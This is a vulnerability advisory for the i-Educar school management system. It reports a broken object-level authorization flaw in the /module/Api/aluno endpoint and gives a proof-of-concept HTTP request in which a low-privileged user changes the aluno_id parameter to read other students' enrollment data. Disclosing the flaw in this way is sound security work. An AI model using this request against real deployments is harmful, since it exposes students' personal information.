# Broken Object Level Authorization (BOLA) allows enumeration of student records via /module/Api/aluno

### Summary

A Broken Object Level Authorization (BOLA) vulnerability was identified in the `/module/Api/aluno` endpoint of the **i-Educar** application.  
This flaw allows low-privileged users (e.g., standard student/responsible accounts) to retrieve enrollment (`matriculas`) information of students outside their scope, exposing Personally Identifiable Information (PII) without proper authorization checks.

---

### Details

**Vulnerable Endpoint:**  
`GET /module/Api/aluno`

The application fails to enforce **object-level authorization** when handling this endpoint. As a result, any authenticated user can manipulate the request values to access sensitive information (names, IDs, enrollment status) of students.

---
### Proof of Concept (PoC)

1. Authenticate as a non-privileged user.

![[Pasted image 20250821225155.png]]
![[Pasted image 20250821225232.png]]
2. Send the following request:

```
GET /module/Api/aluno?&oper=get&resource=matriculas&aluno_id=206 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://localhost/intranet/educar_aluno_det.php?cod_aluno=206
Cookie: i_educar_session=[LOW PRIVILEGED COOKIE]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

```

![[Pasted image 20250821224929.png]]

3. We could observe that informations about the student were returned.

---

### Impact

This vulnerability exposes **Personally Identifiable Information (PII)** of students, including:

- Names
    
- Class, course, and enrollment status
    
- Institutional relationships
    

**Potential risks include:**

- Unauthorized data harvesting of all students across institutions
    
- Privacy violations (LGPD compliance risk)
    
- Social engineering opportunities by attackers
    
- Reputational damage for the institution
    

**Severity:** High

- Low privileges required
    
- High impact (sensitive data exposure)
    
- Easy to exploit with parameter tampering
    

---
